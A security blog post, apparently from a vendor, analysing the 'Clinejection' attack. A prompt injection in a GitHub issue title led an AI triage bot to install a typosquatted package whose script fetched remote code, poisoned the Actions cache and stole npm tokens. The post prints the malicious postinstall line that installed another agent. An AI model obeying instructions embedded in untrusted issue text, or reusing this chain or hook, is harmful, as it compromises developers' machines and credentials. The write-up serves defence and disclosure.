# A GitHub Issue Title Compromised 4,000 Developer Machines

Five steps from a GitHub issue title to 4,000 compromised developer machines. The entry point was natural language.

On February 17, 2026, someone published cline@2.3.0 to npm. The CLI binary was byte-identical to the previous version. The only change was one line in package.json:

```
"postinstall": "npm install -g openclaw@latest"
```

For the next eight hours, every developer who installed or updated Cline got OpenClaw - a separate AI agent with full system access - installed globally on their machine without consent. Approximately 4,000 downloads occurred before the package was pulled.

The interesting part is not the payload. It is how the attacker got the npm token in the first place: by injecting a prompt into a GitHub issue title, which an AI triage bot read, interpreted as an instruction, and executed.

## The full chain

The attack - which Snyk named "Clinejection" - composes five well-understood vulnerabilities into a single exploit that requires nothing more than opening a GitHub issue.

**Step 1: Prompt injection via issue title.** Cline had deployed an AI-powered issue triage workflow using Anthropic's claude-code-action. The workflow was configured with `allowed_non_write_users: "*"`, meaning any GitHub user could trigger it by opening an issue. The issue title was interpolated directly into Claude's prompt via `${{ github.event.issue.title }}` without sanitisation.

On January 28, an attacker created Issue #8904 with a title crafted to look like a performance report but containing an embedded instruction: install a package from a specific GitHub repository.

**Step 2: The AI bot executes arbitrary code.** Claude interpreted the injected instruction as legitimate and ran `npm install` pointing to the attacker's fork - a typosquatted repository (glthub-actions/cline, note the missing 'i' in 'github'). The fork's package.json contained a preinstall script that fetched and executed a remote shell script.

**Step 3: Cache poisoning.** The shell script deployed Cacheract, a GitHub Actions cache poisoning tool. It flooded the cache with over 10GB of junk data, triggering GitHub's LRU eviction policy and evicting legitimate cache entries. The poisoned entries were crafted to match the cache key pattern used by Cline's nightly release workflow.

**Step 4: Credential theft.** When the nightly release workflow ran and restored node_modules from cache, it got the compromised version. The release workflow held the NPM_RELEASE_TOKEN, VSCE_PAT (VS Code Marketplace), and OVSX_PAT (OpenVSX). All three were exfiltrated.

**Step 5: Malicious publish.** Using the stolen npm token, the attacker published cline@2.3.0 with the OpenClaw postinstall hook. The compromised version was live for eight hours before StepSecurity's automated monitoring flagged it - approximately 14 minutes after publication.

## A botched rotation made it worse

Security researcher Adnan Khan had actually discovered the vulnerability chain in late December 2025 and reported it via a GitHub Security Advisory on January 1, 2026. He sent multiple follow-ups over five weeks. None received a response.

When Khan publicly disclosed on February 9, Cline patched within 30 minutes by removing the AI triage workflows. They began credential rotation the next day.

But the rotation was incomplete. The team deleted the wrong token, leaving the exposed one active. They discovered the error on February 11 and re-rotated. But the attacker had already exfiltrated the credentials, and the npm token remained valid long enough to publish the compromised package six days later.

Khan was not the attacker. A separate, unknown actor found Khan's proof-of-concept on his test repository and weaponised it against Cline directly.

## The new pattern: AI installs AI

The specific vulnerability chain is interesting but not unprecedented. Prompt injection, cache poisoning, and credential theft are all documented attack classes. What makes Clinejection distinct is the outcome: one AI tool silently bootstrapping a second AI agent on developer machines.

This creates a recursion problem in the supply chain. The developer trusts Tool A (Cline). Tool A is compromised to install Tool B (OpenClaw). Tool B has its own capabilities - shell execution, credential access, persistent daemon installation - that are independent of Tool A and invisible to the developer's original trust decision.

OpenClaw as installed could read credentials from ~/.openclaw/, execute shell commands via its Gateway API, and install itself as a persistent system daemon surviving reboots. The severity was debated - Endor Labs characterised the payload as closer to a proof-of-concept than a weaponised attack - but the mechanism is what matters. The next payload will not be a proof-of-concept.

This is the supply chain equivalent of [confused deputy](https://en.wikipedia.org/wiki/Confused_deputy_problem): the developer authorises Cline to act on their behalf, and Cline (via compromise) delegates that authority to an entirely separate agent the developer never evaluated, never configured, and never consented to.

## Why existing controls did not catch it

- **npm audit**: The postinstall script installs a legitimate, non-malicious package (OpenClaw). There is no malware to detect.

- **Code review**: The CLI binary was byte-identical to the previous version. Only package.json changed, and only by one line. Automated diff checks that focus on binary changes would miss it.

- **Provenance attestations**: Cline was not using OIDC-based npm provenance at the time. The compromised token could publish without provenance metadata, which StepSecurity flagged as anomalous.

- **Permission prompts**: The installation happens in a postinstall hook during npm install. No AI coding tool prompts the user before a dependency's lifecycle script runs. The operation is invisible.

The attack exploited the gap between what developers think they are installing (a specific version of Cline) and what actually executes (arbitrary lifecycle scripts from the package and everything it transitively installs).

## What Cline changed afterward

Cline's post-mortem outlines several remediation steps:

- Eliminated GitHub Actions cache usage from credential-handling workflows
- Adopted OIDC provenance attestations for npm publishing, eliminating long-lived tokens
- Added verification requirements for credential rotation
- Began working on a formal vulnerability disclosure process with SLAs
- Commissioned third-party security audits of CI/CD infrastructure

These are meaningful improvements. The OIDC migration alone would have prevented the attack - a stolen token cannot publish packages when provenance requires a cryptographic attestation from a specific GitHub Actions workflow.

## The architectural question

Clinejection is a supply chain attack, but it is also an agent security problem. The entry point was natural language in a GitHub issue title. The first link in the chain was an AI bot that interpreted untrusted text as an instruction and executed it with the privileges of the CI environment.

This is the same structural pattern we have written about in the context of MCP tool poisoning and agent skill registries - untrusted input reaches an agent, the agent acts on it, and nothing evaluates the resulting operations before they execute.

The difference here is that the agent was not a developer's local coding assistant. It was an automated CI workflow that ran on every new issue, with shell access and cached credentials. The blast radius was not one developer's machine - it was the entire project's publication pipeline.

Every team deploying AI agents in CI/CD - for issue triage, code review, automated testing, or any other workflow - has this same exposure. The agent processes untrusted input (issues, PRs, comments) and has access to secrets (tokens, keys, credentials). The question is whether anything evaluates what the agent does with that access.

Per-syscall interception catches this class of attack at the operation layer. When the AI triage bot attempts to run npm install from an unexpected repository, the operation is evaluated against policy before it executes - regardless of what the issue title said. When a lifecycle script attempts to exfiltrate credentials to an external host, the egress is blocked.

The entry point changes. The operations do not.